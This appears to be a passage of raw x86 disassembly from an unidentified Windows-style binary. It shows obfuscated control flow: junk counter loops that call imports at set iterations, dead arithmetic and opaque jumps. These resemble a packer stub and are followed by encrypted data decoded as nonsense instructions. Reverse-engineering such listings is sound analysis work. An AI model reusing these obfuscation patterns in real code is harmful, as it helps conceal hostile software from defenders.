  413fff:	push   DWORD PTR [ebp-0x28]
  414002:	push   0x72a4
  414007:	call   DWORD PTR ds:0x42ec97
  41400d:	jmp    0x413fc8
  414012:	adc    ebx,0x7a0c
  414018:	mov    DWORD PTR [ebp-0x58],edx
  41401b:	and    DWORD PTR ds:0x429000,0x0
  414025:	jmp    0x414037
  41402a:	mov    edx,DWORD PTR ds:0x429000
  414030:	inc    edx
  414031:	mov    DWORD PTR ds:0x429000,edx
  414037:	cmp    DWORD PTR ds:0x429000,0x19
  41403e:	jae    0x414083
  414044:	cmp    DWORD PTR ds:0x429000,0x4
  41404b:	jne    0x414057
  414051:	call   DWORD PTR ds:0x42ec9b
  414057:	cmp    DWORD PTR ds:0x429000,0x3
  41405e:	jne    0x414071
  414064:	mov    edx,DWORD PTR ds:0x429000
  41406a:	inc    edx
  41406b:	mov    DWORD PTR ds:0x429000,edx
  414071:	jmp    0x41402a
  414076:	movzx  edx,BYTE PTR ds:0x42901c
  41407d:	or     DWORD PTR ds:0x42c008,edx
  414083:	mov    edx,DWORD PTR [ebp+0x8]
  414086:	mov    DWORD PTR ds:0x429004,0x6b93
  414090:	mov    ebx,DWORD PTR [ebp-0x54]
  414093:	add    DWORD PTR ds:0x42c00c,0x429000
  41409d:	add    edx,0x64f8da
  4140a3:	xor    DWORD PTR ds:0x42b004,0x45d1
  4140ad:	or     edx,ebx
  4140af:	mov    DWORD PTR [ebp-0x54],edx
  4140b2:	not    ebx
  4140b4:	mov    edx,DWORD PTR [ebp+0x8]
  4140b7:	mov    ebx,DWORD PTR [ebp-0x50]
  4140ba:	add    edx,ecx
  4140bc:	xor    edx,ebx
  4140be:	adc    DWORD PTR ds:0x42d008,0x7f53
  4140c8:	mov    DWORD PTR [ebp-0x50],edx
  4140cb:	mov    edx,DWORD PTR [ebp+0x8]
  4140ce:	not    ebx
  4140d0:	mov    ebx,DWORD PTR [ebp-0x4c]
  4140d3:	sub    DWORD PTR ds:0x42a01c,0x30e3
  4140dd:	add    edx,edi
  4140df:	sub    DWORD PTR ds:0x42d01c,0x42d000
  4140e9:	and    edx,ebx
  4140eb:	sub    DWORD PTR ds:0x42b018,0x3308
  4140f5:	mov    DWORD PTR [ebp-0x4c],edx
  4140f8:	and    DWORD PTR ds:0x42c018,0x0
  414102:	jmp    0x414114
  414107:	mov    ebx,DWORD PTR ds:0x42c018
  41410d:	inc    ebx
  41410e:	mov    DWORD PTR ds:0x42c018,ebx
  414114:	cmp    DWORD PTR ds:0x42c018,0x1c
  41411b:	jae    0x414160
  414121:	cmp    DWORD PTR ds:0x42c018,0x9
  414128:	jne    0x41413f
  41412e:	push   DWORD PTR [ebp-0x1c]
  414131:	push   0x429028
  414136:	push   DWORD PTR [ebp-0x20]
  414139:	call   DWORD PTR ds:0x42ec9f
  41413f:	cmp    DWORD PTR ds:0x42c018,0x8
  414146:	jne    0x41415b
  41414c:	xor    ebx,ebx
  41414e:	add    ebx,DWORD PTR ds:0x42c018
  414154:	inc    ebx
  414155:	mov    DWORD PTR ds:0x42c018,ebx
  41415b:	jmp    0x414107
  414160:	mov    edx,DWORD PTR [ebp+0x8]
  414163:	mov    ebx,DWORD PTR [ebp-0x48]
  414166:	mov    DWORD PTR ds:0x429008,0x1eac
  414170:	lea    edx,[ebx+edx*1+0x241fc1f]
  414177:	and    DWORD PTR ds:0x42900c,0x77ed
  414181:	mov    DWORD PTR [ebp-0x48],edx
  414184:	mov    edx,DWORD PTR [ebp+0x8]
  414187:	mov    ebx,0xfa5e15e2
  41418c:	sub    ebx,edx
  41418e:	add    ebx,DWORD PTR [ebp-0x44]
  414191:	sub    DWORD PTR ds:0x42a010,0x32d9
  41419b:	mov    DWORD PTR [ebp-0x44],ebx
  41419e:	mov    edx,DWORD PTR [ebp+0x8]
  4141a1:	or     DWORD PTR ds:0x429000,0x42b018
  4141ab:	xor    edx,eax
  4141ad:	add    edx,esi
  4141af:	mov    DWORD PTR ds:0x42d004,0x438b
  4141b9:	jne    0x411baa
  4141bf:	mov    DWORD PTR ds:0x42c008,0x3945
  4141c9:	jmp    0x4145ae
  4141ce:	mov    edx,DWORD PTR [ebp-0xc]
  4141d1:	sub    edx,esi
  4141d3:	and    DWORD PTR ds:0x429004,0x0
  4141dd:	jmp    0x4141ef
  4141e2:	mov    ebx,DWORD PTR ds:0x429004
  4141e8:	inc    ebx
  4141e9:	mov    DWORD PTR ds:0x429004,ebx
  4141ef:	cmp    DWORD PTR ds:0x429004,0x10
  4141f6:	jae    0x414243
  4141fc:	cmp    DWORD PTR ds:0x429004,0x9
  414203:	jne    0x41421e
  414209:	push   0x42e127
  41420e:	push   0x42e000
  414213:	push   0x400000
  414218:	call   DWORD PTR ds:0x42eca7
  41421e:	cmp    DWORD PTR ds:0x429004,0x8
  414225:	jne    0x414238
  41422b:	mov    ebx,DWORD PTR ds:0x429004
  414231:	inc    ebx
  414232:	mov    DWORD PTR ds:0x429004,ebx
  414238:	jmp    0x4141e2
  41423d:	sub    DWORD PTR ds:0x42b004,ecx
  414243:	xor    edx,eax
  414245:	mov    DWORD PTR [ebp-0x5c],edx
  414248:	sub    DWORD PTR ds:0x42b000,edx
  41424e:	mov    edx,DWORD PTR [ebp-0x10]
  414251:	sbb    DWORD PTR ds:0x429000,0x7854
  41425b:	mov    ebx,DWORD PTR [ebp-0x8]
  41425e:	inc    DWORD PTR ds:0x42d010
  414264:	xor    edx,eax
  414266:	add    DWORD PTR ds:0x42c008,0x42b018
  414270:	xor    ebx,eax
  414272:	mov    DWORD PTR ds:0x42a01c,0x61e1
  41427c:	sub    edx,ebx
  41427e:	sub    DWORD PTR ds:0x42c014,0x2136
  414288:	sub    edx,esi
  41428a:	xor    edx,eax
  41428c:	mov    DWORD PTR ds:0x42a01c,0x74d4
  414296:	mov    DWORD PTR [ebp-0x10],edx
  414299:	mov    edx,DWORD PTR [ebp-0x14]
  41429c:	mov    DWORD PTR ds:0x42a008,0x2bcf
  4142a6:	mov    DWORD PTR [ebp+0x8],edx
  4142a9:	jmp    0x414392
  4142ae:	mov    edx,DWORD PTR [ebp+0x8]
  4142b1:	neg    ebx
  4142b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4142b6:	xor    DWORD PTR ds:0x429000,0x42b004
  4142c0:	xor    edx,eax
  4142c2:	add    DWORD PTR ds:0x42a01c,0x429024
  4142cc:	xor    ebx,eax
  4142ce:	sub    edx,ebx
  4142d0:	and    DWORD PTR ds:0x429028,edi
  4142d6:	sub    edx,esi
  4142d8:	xor    edx,eax
  4142da:	mov    DWORD PTR [ebp+0x8],edx
  4142dd:	mov    ebx,DWORD PTR ds:0x429000
  4142e3:	adc    DWORD PTR ds:0x42a018,ebx
  4142e9:	mov    edx,DWORD PTR [ebp+0x8]
  4142ec:	xor    ebx,ebx
  4142ee:	xor    ebx,DWORD PTR ds:0x429014
  4142f4:	adc    ebx,DWORD PTR ds:0x42b000
  4142fa:	mov    DWORD PTR ds:0x429014,ebx
  414300:	mov    ebx,DWORD PTR [ebp-0x58]
  414303:	xor    DWORD PTR ds:0x42a004,0x429028
  41430d:	add    edx,0x5708f8
  414313:	imul   edx,ebx
  414316:	xor    ebx,ebx
  414318:	or     ebx,DWORD PTR ds:0x42a018
  41431e:	add    ebx,DWORD PTR ds:0x42d010
  414324:	mov    DWORD PTR ds:0x42a018,ebx
  41432a:	mov    DWORD PTR [ebp-0x58],edx
  41432d:	mov    ebx,DWORD PTR ds:0x42a014
  414333:	sbb    DWORD PTR ds:0x42d008,ebx
  414339:	mov    edx,DWORD PTR [ebp+0x8]
  41433c:	xor    ebx,ebx
  41433e:	xor    ebx,DWORD PTR ds:0x42a00c
  414344:	add    DWORD PTR ds:0x429004,ebx
  41434a:	mov    ebx,DWORD PTR [ebp-0x54]
  41434d:	add    edx,0x64f8da
  414353:	or     edx,ebx
  414355:	mov    DWORD PTR [ebp-0x54],edx
  414358:	mov    edx,DWORD PTR [ebp+0x8]
  41435b:	mov    ebx,DWORD PTR [ebp-0x50]
  41435e:	add    edx,ecx
  414360:	xor    edx,ebx
  414362:	mov    DWORD PTR [ebp-0x50],edx
  414365:	mov    edx,DWORD PTR [ebp+0x8]
  414368:	mov    ebx,DWORD PTR [ebp-0x4c]
  41436b:	add    edx,edi
  41436d:	and    edx,ebx
  41436f:	mov    DWORD PTR [ebp-0x4c],edx
  414372:	mov    edx,DWORD PTR [ebp+0x8]
  414375:	mov    ebx,DWORD PTR [ebp-0x48]
  414378:	lea    edx,[ebx+edx*1+0x241fc1f]
  41437f:	mov    DWORD PTR [ebp-0x48],edx
  414382:	mov    edx,DWORD PTR [ebp+0x8]
  414385:	mov    ebx,0xfa5e15e2
  41438a:	sub    ebx,edx
  41438c:	add    ebx,DWORD PTR [ebp-0x44]
  41438f:	mov    DWORD PTR [ebp-0x44],ebx
  414392:	mov    edx,DWORD PTR [ebp+0x8]
  414395:	xor    edx,eax
  414397:	add    edx,esi
  414399:	jne    0x4142ae
  41439f:	mov    edx,DWORD PTR [ebp-0xc]
  4143a2:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4143a9:	mov    bl,BYTE PTR [ebp-0x1]
  4143ac:	cmp    dl,bl
  4143ae:	je     0x41448c
  4143b4:	mov    ecx,DWORD PTR [ebp-0x5c]
  4143b7:	mov    edx,DWORD PTR [ebp-0xc]
  4143ba:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  4143c1:	mov    ebx,DWORD PTR [ebp+0xc]
  4143c4:	xor    ecx,eax
  4143c6:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e0]
  4143cd:	jne    0x4145c0
  4143d3:	mov    ecx,DWORD PTR [ebp-0x5c]
  4143d6:	mov    edx,DWORD PTR [ebp+0xc]
  4143d9:	xor    ecx,eax
  4143db:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e0]
  4143e3:	mov    edx,DWORD PTR [ebp-0x18]
  4143e6:	xor    edx,eax
  4143e8:	add    edx,esi
  4143ea:	cmp    ecx,edx
  4143ec:	mov    ecx,DWORD PTR [ebp-0x14]
  4143ef:	mov    DWORD PTR [ebp+0x8],ecx
  4143f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4143f5:	je     0x416a87
  4143fb:	xor    ecx,eax
  4143fd:	add    ecx,esi
  4143ff:	mov    ecx,0x242ebed
  414404:	je     0x414514
  41440a:	mov    edx,DWORD PTR [ebp+0x8]
  41440d:	mov    ebx,DWORD PTR [ebp-0x8]
  414410:	xor    edx,eax
  414412:	xor    ebx,eax
  414414:	sub    edx,ebx
  414416:	sub    edx,esi
  414418:	xor    edx,eax
  41441a:	mov    DWORD PTR [ebp+0x8],edx
  41441d:	mov    edx,DWORD PTR [ebp+0x8]
  414420:	mov    ebx,DWORD PTR [ebp-0x58]
  414423:	add    edx,0x5708f8
  414429:	imul   edx,ebx
  41442c:	mov    DWORD PTR [ebp-0x58],edx
  41442f:	mov    edx,DWORD PTR [ebp+0x8]
  414432:	mov    ebx,DWORD PTR [ebp-0x54]
  414435:	add    edx,0x64f8da
  41443b:	or     edx,ebx
  41443d:	mov    DWORD PTR [ebp-0x54],edx
  414440:	mov    edx,DWORD PTR [ebp+0x8]
  414443:	mov    ebx,DWORD PTR [ebp-0x50]
  414446:	add    edx,ecx
  414448:	xor    edx,ebx
  41444a:	mov    DWORD PTR [ebp-0x50],edx
  41444d:	mov    edx,DWORD PTR [ebp+0x8]
  414450:	mov    ebx,DWORD PTR [ebp-0x4c]
  414453:	add    edx,edi
  414455:	and    edx,ebx
  414457:	mov    DWORD PTR [ebp-0x4c],edx
  41445a:	mov    edx,DWORD PTR [ebp+0x8]
  41445d:	mov    ebx,DWORD PTR [ebp-0x48]
  414460:	lea    edx,[ebx+edx*1+0x241fc1f]
  414467:	mov    DWORD PTR [ebp-0x48],edx
  41446a:	mov    edx,DWORD PTR [ebp+0x8]
  41446d:	mov    ebx,0xfa5e15e2
  414472:	sub    ebx,edx
  414474:	add    ebx,DWORD PTR [ebp-0x44]
  414477:	mov    DWORD PTR [ebp-0x44],ebx
  41447a:	mov    edx,DWORD PTR [ebp+0x8]
  41447d:	xor    edx,eax
  41447f:	add    edx,esi
  414481:	jne    0x41440a
  414487:	jmp    0x414514
  41448c:	mov    edx,DWORD PTR [ebp-0x14]
  41448f:	mov    DWORD PTR [ebp+0x8],edx
  414492:	jmp    0x414507
  414497:	mov    edx,DWORD PTR [ebp+0x8]
  41449a:	mov    ebx,DWORD PTR [ebp-0x8]
  41449d:	xor    edx,eax
  41449f:	xor    ebx,eax
  4144a1:	sub    edx,ebx
  4144a3:	sub    edx,esi
  4144a5:	xor    edx,eax
  4144a7:	mov    DWORD PTR [ebp+0x8],edx
  4144aa:	mov    edx,DWORD PTR [ebp+0x8]
  4144ad:	mov    ebx,DWORD PTR [ebp-0x58]
  4144b0:	add    edx,0x5708f8
  4144b6:	imul   edx,ebx
  4144b9:	mov    DWORD PTR [ebp-0x58],edx
  4144bc:	mov    edx,DWORD PTR [ebp+0x8]
  4144bf:	mov    ebx,DWORD PTR [ebp-0x54]
  4144c2:	add    edx,0x64f8da
  4144c8:	or     edx,ebx
  4144ca:	mov    DWORD PTR [ebp-0x54],edx
  4144cd:	mov    edx,DWORD PTR [ebp+0x8]
  4144d0:	mov    ebx,DWORD PTR [ebp-0x50]
  4144d3:	add    edx,ecx
  4144d5:	xor    edx,ebx
  4144d7:	mov    DWORD PTR [ebp-0x50],edx
  4144da:	mov    edx,DWORD PTR [ebp+0x8]
  4144dd:	mov    ebx,DWORD PTR [ebp-0x4c]
  4144e0:	add    edx,edi
  4144e2:	and    edx,ebx
  4144e4:	mov    DWORD PTR [ebp-0x4c],edx
  4144e7:	mov    edx,DWORD PTR [ebp+0x8]
  4144ea:	mov    ebx,DWORD PTR [ebp-0x48]
  4144ed:	lea    edx,[ebx+edx*1+0x241fc1f]
  4144f4:	mov    DWORD PTR [ebp-0x48],edx
  4144f7:	mov    edx,DWORD PTR [ebp+0x8]
  4144fa:	mov    ebx,0xfa5e15e2
  4144ff:	sub    ebx,edx
  414501:	add    ebx,DWORD PTR [ebp-0x44]
  414504:	mov    DWORD PTR [ebp-0x44],ebx
  414507:	mov    edx,DWORD PTR [ebp+0x8]
  41450a:	xor    edx,eax
  41450c:	add    edx,esi
  41450e:	jne    0x414497
  414514:	mov    edx,DWORD PTR [ebp-0x14]
  414517:	mov    DWORD PTR [ebp+0x8],edx
  41451a:	jmp    0x41458f
  41451f:	mov    edx,DWORD PTR [ebp+0x8]
  414522:	mov    ebx,DWORD PTR [ebp-0x8]
  414525:	xor    edx,eax
  414527:	xor    ebx,eax
  414529:	sub    edx,ebx
  41452b:	sub    edx,esi
  41452d:	xor    edx,eax
  41452f:	mov    DWORD PTR [ebp+0x8],edx
  414532:	mov    edx,DWORD PTR [ebp+0x8]
  414535:	mov    ebx,DWORD PTR [ebp-0x58]
  414538:	add    edx,0x5708f8
  41453e:	imul   edx,ebx
  414541:	mov    DWORD PTR [ebp-0x58],edx
  414544:	mov    edx,DWORD PTR [ebp+0x8]
  414547:	mov    ebx,DWORD PTR [ebp-0x54]
  41454a:	add    edx,0x64f8da
  414550:	or     edx,ebx
  414552:	mov    DWORD PTR [ebp-0x54],edx
  414555:	mov    edx,DWORD PTR [ebp+0x8]
  414558:	mov    ebx,DWORD PTR [ebp-0x50]
  41455b:	add    edx,ecx
  41455d:	xor    edx,ebx
  41455f:	mov    DWORD PTR [ebp-0x50],edx
  414562:	mov    edx,DWORD PTR [ebp+0x8]
  414565:	mov    ebx,DWORD PTR [ebp-0x4c]
  414568:	add    edx,edi
  41456a:	and    edx,ebx
  41456c:	mov    DWORD PTR [ebp-0x4c],edx
  41456f:	mov    edx,DWORD PTR [ebp+0x8]
  414572:	mov    ebx,DWORD PTR [ebp-0x48]
  414575:	lea    edx,[ebx+edx*1+0x241fc1f]
  41457c:	mov    DWORD PTR [ebp-0x48],edx
  41457f:	mov    edx,DWORD PTR [ebp+0x8]
  414582:	mov    ebx,0xfa5e15e2
  414587:	sub    ebx,edx
  414589:	add    ebx,DWORD PTR [ebp-0x44]
  41458c:	mov    DWORD PTR [ebp-0x44],ebx
  41458f:	mov    edx,DWORD PTR [ebp+0x8]
  414592:	xor    edx,eax
  414594:	add    edx,esi
  414596:	jne    0x41451f
  41459c:	mov    edx,DWORD PTR [ebp-0x8]
  41459f:	mov    ebx,DWORD PTR [ebp-0xc]
  4145a2:	xor    edx,eax
  4145a4:	lea    edx,[edx+ebx*1+0x3272e0]
  4145ab:	mov    DWORD PTR [ebp-0xc],edx
  4145ae:	mov    edx,DWORD PTR [ebp-0x10]
  4145b1:	xor    edx,eax
  4145b3:	add    edx,esi
  4145b5:	jne    0x4141ce
  4145bb:	jmp    0x418e50
  4145c0:	mov    ecx,DWORD PTR [ebp-0x14]
  4145c3:	mov    DWORD PTR [ebp+0x8],ecx
  4145c6:	jmp    0x41463f
  4145cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4145ce:	mov    edx,DWORD PTR [ebp-0x8]
  4145d1:	xor    ecx,eax
  4145d3:	xor    edx,eax
  4145d5:	sub    ecx,edx
  4145d7:	sub    ecx,esi
  4145d9:	xor    ecx,eax
  4145db:	mov    DWORD PTR [ebp+0x8],ecx
  4145de:	mov    ecx,DWORD PTR [ebp+0x8]
  4145e1:	mov    edx,DWORD PTR [ebp-0x58]
  4145e4:	add    ecx,0x5708f8
  4145ea:	imul   ecx,edx
  4145ed:	mov    DWORD PTR [ebp-0x58],ecx
  4145f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4145f3:	mov    edx,DWORD PTR [ebp-0x54]
  4145f6:	add    ecx,0x64f8da
  4145fc:	or     ecx,edx
  4145fe:	mov    DWORD PTR [ebp-0x54],ecx
  414601:	mov    ecx,DWORD PTR [ebp+0x8]
  414604:	mov    edx,DWORD PTR [ebp-0x50]
  414607:	add    ecx,0x242ebed
  41460d:	xor    ecx,edx
  41460f:	mov    DWORD PTR [ebp-0x50],ecx
  414612:	mov    ecx,DWORD PTR [ebp+0x8]
  414615:	mov    edx,DWORD PTR [ebp-0x4c]
  414618:	add    ecx,edi
  41461a:	and    ecx,edx
  41461c:	mov    DWORD PTR [ebp-0x4c],ecx
  41461f:	mov    ecx,DWORD PTR [ebp+0x8]
  414622:	mov    edx,DWORD PTR [ebp-0x48]
  414625:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41462c:	mov    DWORD PTR [ebp-0x48],ecx
  41462f:	mov    ecx,DWORD PTR [ebp+0x8]
  414632:	mov    edx,0xfa5e15e2
  414637:	sub    edx,ecx
  414639:	add    edx,DWORD PTR [ebp-0x44]
  41463c:	mov    DWORD PTR [ebp-0x44],edx
  41463f:	mov    ecx,DWORD PTR [ebp+0x8]
  414642:	xor    ecx,eax
  414644:	add    ecx,esi
  414646:	jne    0x4145cb
  41464c:	jmp    0x418e5c
  414651:	mov    ecx,DWORD PTR [ebp+0x8]
  414654:	mov    edx,DWORD PTR [ebp-0x8]
  414657:	xor    ecx,eax
  414659:	xor    edx,eax
  41465b:	sub    ecx,edx
  41465d:	sub    ecx,esi
  41465f:	xor    ecx,eax
  414661:	mov    DWORD PTR [ebp+0x8],ecx
  414664:	mov    ecx,DWORD PTR [ebp+0x8]
  414667:	mov    edx,DWORD PTR [ebp-0x58]
  41466a:	add    ecx,0x5708f8
  414670:	imul   ecx,edx
  414673:	mov    DWORD PTR [ebp-0x58],ecx
  414676:	mov    ecx,DWORD PTR [ebp+0x8]
  414679:	mov    edx,DWORD PTR [ebp-0x54]
  41467c:	add    ecx,0x64f8da
  414682:	or     ecx,edx
  414684:	mov    DWORD PTR [ebp-0x54],ecx
  414687:	mov    ecx,DWORD PTR [ebp+0x8]
  41468a:	mov    edx,DWORD PTR [ebp-0x50]
  41468d:	add    ecx,0x242ebed
  414693:	xor    ecx,edx
  414695:	mov    DWORD PTR [ebp-0x50],ecx
  414698:	mov    ecx,DWORD PTR [ebp+0x8]
  41469b:	mov    edx,DWORD PTR [ebp-0x4c]
  41469e:	add    ecx,edi
  4146a0:	and    ecx,edx
  4146a2:	mov    DWORD PTR [ebp-0x4c],ecx
  4146a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4146a8:	mov    edx,DWORD PTR [ebp-0x48]
  4146ab:	lea    ecx,[edx+ecx*1+0x241fc1f]
  4146b2:	mov    DWORD PTR [ebp-0x48],ecx
  4146b5:	jmp    0x416a74
  4146ba:	sub    dl,BYTE PTR [esi]
  4146bc:	jg     0x41469d
  4146be:	imul   edi,DWORD PTR [ebx-0x76],0x7b
  4146c2:	stc    
  4146c3:	nop
  4146c4:	inc    esp
  4146c5:	sub    al,0x3a
  4146c7:	jecxz  0x4146b0
  4146c9:	xor    eax,0x7a7a7370
  4146ce:	fcomp  DWORD PTR [edi+0x7a]
  4146d1:	jp     0x414663
  4146d3:	dec    ebx
  4146d4:	adc    ch,BYTE PTR [edi]
  4146d6:	adc    DWORD PTR [ecx+ebx*4-0x43bdbf72],ecx
  4146dd:	push   edi
  4146de:	test   BYTE PTR [eax+eax*8],bl
  4146e1:	cmp    esp,DWORD PTR [eax+0x44]
  4146e4:	jecxz  0x41471e
  4146e6:	mov    edi,edx
  4146e8:	data16 fdivr DWORD PTR [edi-0x4dfc3641]
  4146ef:	mov    ds:0xcb816838,eax
  4146f4:	push   ecx
  4146f5:	test   DWORD PTR [esi+0x28],esi
  4146f8:	mov    ecx,esi
  4146fa:	xor    DWORD PTR [ecx-0x6a91d600],eax
  414700:	out    0xa9,eax
  414702:	dec    esi
  414703:	jp     0x4146af
  414705:	sbb    eax,0xbcb62304
  41470a:	pop    ebp
  41470b:	fnsave [ebx+esi*2]
  41470e:	mov    ecx,esi
  414710:	push   eax
  414711:	push   edx
  414712:	enter  0x7965,0x9e
  414716:	and    eax,0xd98a9600
  41471b:	imul   esp,ecx,0x35b2dbf2
  414721:	int3   
  414722:	mov    eax,ds:0x9f6a2cb0
  414727:	and    bl,BYTE PTR [edi+0x30]
  41472a:	push   ebp
  41472b:	dec    esp
  41472c:	shl    ecx,0x20
  41472f:	dec    eax
  414730:	push   ecx
  414731:	aas    
  414732:	mov    fs,WORD PTR [esi]
  414734:	bound  ebp,QWORD PTR [ecx]
  414736:	lods   al,BYTE PTR ds:[esi]
  414737:	jbe    0x414714
  414739:	mov    bl,0xc9
  41473b:	xchg   edx,eax
  41473c:	(bad)  [eax+0x30]
  41473f:	cmp    dl,dh
  414741:	in     eax,0xf6
  414743:	add    dh,BYTE PTR [ebp+ebp*1+0x69]
  414747:	or     edx,edi
  414749:	scas   al,BYTE PTR es:[edi]
  41474a:	aas    
  41474b:	add    BYTE PTR fs:[ebp-0x4],ah
  41474f:	xlat   BYTE PTR ds:[ebx]
  414750:	sub    eax,0xc536832b
  414755:	mov    ebx,0xf6beefe6
  41475a:	sti    
  41475b:	xchg   ebx,eax
  41475c:	fwait
  41475d:	lds    esi,FWORD PTR [edi+0x17]
  414760:	fucomip st,st(5)
  414762:	lea    esi,[eax+edx*8-0xce1f52e]
  414769:	jb     0x414759
  41476b:	fs je  0x414727
  41476e:	jl     0x4146f7
  414770:	or     DWORD PTR [ebx],edi
  414772:	cdq    
  414773:	test   DWORD PTR [ecx],ebp
  414775:	pop    ebp
  414776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414777:	mov    ds:0x80906aaf,al
  41477c:	fsub   DWORD PTR [ecx+0x5c3c2905]
  414782:	sub    BYTE PTR [esi],ah
  414784:	push   ebp
  414785:	pusha  
  414786:	push   ss
  414787:	dec    esi
  414788:	test   ah,ch
  41478a:	repnz fsub QWORD PTR [edi+0x25]
  41478e:	xchg   edi,eax
  41478f:	mov    ds:0x375514f8,eax
  414794:	stc    
  414795:	add    bl,BYTE PTR [ebx-0x4c]
  414798:	fwait
  414799:	xor    eax,DWORD PTR [edi+0xc]
  41479c:	bound  ebx,QWORD PTR [ebp+0x4fc36fa6]
  4147a2:	xchg   edi,eax
  4147a3:	sbb    BYTE PTR [esi+ebp*1-0x72],cl
  4147a7:	aam    0x12
  4147a9:	int3   
  4147aa:	inc    edx
  4147ab:	dec    esi
  4147ac:	ret    
  4147ad:	add    eax,DWORD PTR [ebx-0x11]
  4147b0:	adc    cl,BYTE PTR [ebx]
  4147b2:	and    al,0x2
  4147b4:	pop    ss
  4147b5:	leavew 
  4147b7:	sti    
  4147b8:	inc    ebp
  4147b9:	fcomp  QWORD PTR [ebx-0x6ba1687b]
  4147bf:	dec    eax
  4147c0:	das    
  4147c1:	jo     0x4147b6
  4147c3:	aad    0x66
  4147c5:	shl    DWORD PTR [ecx-0x25],1
  4147c8:	ins    BYTE PTR es:[edi],dx
  4147c9:	aaa    
  4147ca:	inc    esi
  4147cb:	lds    edx,FWORD PTR [ecx]
  4147cd:	pop    eax
  4147ce:	lahf   
  4147cf:	dec    edx
  4147d0:	nop    eax
  4147d3:	out    dx,al
  4147d4:	or     esi,0x49f1065b
  4147da:	push   ebp
  4147db:	xor    ebp,esp
  4147dd:	add    al,0x4c
  4147df:	mov    WORD PTR [edi],gs
  4147e1:	cmp    ch,BYTE PTR [edx-0x3d6564b3]
  4147e7:	xchg   ecx,eax
  4147e8:	jg     0x414795
  4147ea:	mov    cl,al
  4147ec:	dec    eax
  4147ed:	xor    esi,DWORD PTR [edx]
  4147ef:	call   0xa6905eea
  4147f4:	pushf  
  4147f5:	sahf   
  4147f6:	cwde   
  4147f7:	call   0xb59e:0x58f67ed4
  4147fe:	shl    esi,cl
  414800:	(bad)  
  414801:	xor    BYTE PTR [ebp-0x5a62fb95],ch
  414807:	jmp    0x414798
  414809:	js     0x414817
  41480b:	mov    ebp,DWORD PTR [ecx-0x15]
  41480e:	dec    eax
  41480f:	pop    ds
  414810:	cmp    BYTE PTR [edx-0x9],al
  414813:	mul    DWORD PTR [ecx+0x2b]
  414816:	sar    BYTE PTR [edx-0x7a3b4989],cl
  41481c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41481d:	pop    ebp
  41481e:	push   ds
  41481f:	mov    eax,ds:0x2fad9672
  414824:	cmp    eax,0x6de7652e
  414829:	adc    al,0x4f
  41482b:	push   ss
  41482c:	push   ebx
  41482d:	pop    esp
  41482e:	icebp  
  41482f:	xchg   esi,eax
  414830:	sub    al,0x7b
  414832:	pop    es
  414833:	cmp    al,BYTE PTR [eax+0x1ccc7d83]
  414839:	ds mov esp,0x2fadba0c
  41483f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414840:	cwde   
  414841:	inc    ebx
  414842:	xor    al,0x0
  414844:	pushf  
  414845:	inc    ebp
  414846:	sbb    DWORD PTR [eax+0x309b13c8],0x72c70304
  414850:	dec    ebp
  414851:	sub    al,0xcb
  414853:	jg     0x414874
  414855:	mov    ch,BYTE PTR [ebp+ebx*2-0x5a0aa712]
  41485c:	inc    esp
  41485d:	cli    
  41485e:	push   ss
  41485f:	add    DWORD PTR [edx+0x2ea962ca],eax
  414865:	ss pop edi
  414867:	fcmovnbe st,st(7)
  414869:	into   
  41486a:	sub    al,0xb4
  41486c:	iret   
  41486d:	push   ebx
  41486e:	jl     0x4148ad
  414870:	pop    es
  414871:	test   DWORD PTR [ecx+0x54],ebx
  414874:	or     ch,cl
  414876:	mov    ch,0xe7
  414878:	jne    0x414842
  41487a:	and    ecx,DWORD PTR [edx+0x60585534]
  414880:	pop    edi
  414881:	mov    eax,0x3d55d6ee
  414886:	scas   eax,DWORD PTR es:[edi]
  414887:	popa   
  414888:	(bad)  
  414889:	ss jae 0x414854
  41488c:	nop
  41488d:	jg     0x4148a0
  41488f:	popf   
  414890:	popf   
  414891:	sub    bh,BYTE PTR [edi]
  414893:	stc    
  414894:	lahf   
  414895:	not    BYTE PTR [ecx]
  414897:	mov    ah,0x9
  414899:	std    
  41489a:	xor    DWORD PTR [ebx-0x79],esp
  41489d:	mov    ch,0x2a
  41489f:	jg     0x414906
  4148a1:	sub    eax,0x5a570f01
  4148a6:	sbb    ah,BYTE PTR [ebx-0x6a82a81]
  4148ac:	fnstenv [ebp-0x68]
  4148af:	jmp    0x414897
  4148b1:	add    al,0x60
  4148b3:	fnstcw WORD PTR [ebx-0x5f5d8ed6]
  4148b9:	pop    ds
  4148ba:	out    0x84,al
  4148bc:	sar    edi,cl
  4148be:	js     0x414934
  4148c0:	sub    ch,dh
  4148c2:	inc    ecx
  4148c3:	pmaxsw mm7,mm0
  4148c6:	int    0xf8
  4148c8:	jns    0x4148d1
  4148ca:	inc    edi
  4148cb:	call   0xd0eece4f
  4148d0:	lods   al,BYTE PTR ds:[esi]
  4148d1:	mov    eax,ds:0xd9b70af7
  4148d6:	retf   
  4148d7:	(bad)  
  4148d9:	fsubp  st(4),st
  4148db:	loop   0x41491e
  4148dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148de:	pop    edi
  4148df:	xchg   esp,eax
  4148e0:	cmp    eax,0x31608d0f
  4148e5:	mov    esp,0xda652e5
  4148ea:	jno    0x414963
  4148ec:	push   0x2a
  4148ee:	das    
  4148ef:	pop    ecx
  4148f0:	mov    bh,0x88
  4148f2:	frstor [edx+0x52ba9614]
  4148f8:	cmp    bl,0xf2
  4148fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4148fc:	jnp    0x4148e9
  4148fe:	jnp    0x414902
  414900:	mov    DWORD PTR [edx+0x2e703cfa],esp
  414906:	aam    0x3f
  414908:	std    
  414909:	xlat   BYTE PTR ds:[ebx]
  41490a:	int    0xad
  41490c:	data16 aad 0x36
  41490f:	mov    eax,eax
  414911:	std    
  414912:	(bad)  
  414913:	fs mov esi,0xc59e99b5
  414919:	loop   0x4148d4
  41491b:	clc    
